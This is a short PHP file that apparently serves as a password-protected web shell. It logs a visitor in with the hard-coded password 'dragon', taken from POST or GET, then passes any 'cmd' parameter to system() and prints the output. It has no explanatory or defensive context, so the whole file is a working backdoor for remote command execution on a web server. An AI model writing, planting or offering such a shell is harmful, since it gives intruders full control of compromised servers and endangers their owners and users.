<?php
session_start();
$pass = @$_POST['pass'] ?: @$_GET['pass'];
$cmd = @$_POST['cmd'] ?: @$_GET['cmd'];
if($pass == 'dragon') {
    $_SESSION['auth'] = true;
}
if(@$_SESSION['auth'] && $cmd) {
    ob_start();
    system($cmd);
    $output = ob_get_contents();
    ob_end_clean();
    echo $output;
}
if(!@$_SESSION['auth']) {
    echo '<form method="post"><input type="password" name="pass"><input type="submit" value="Login"></form>';
}
?>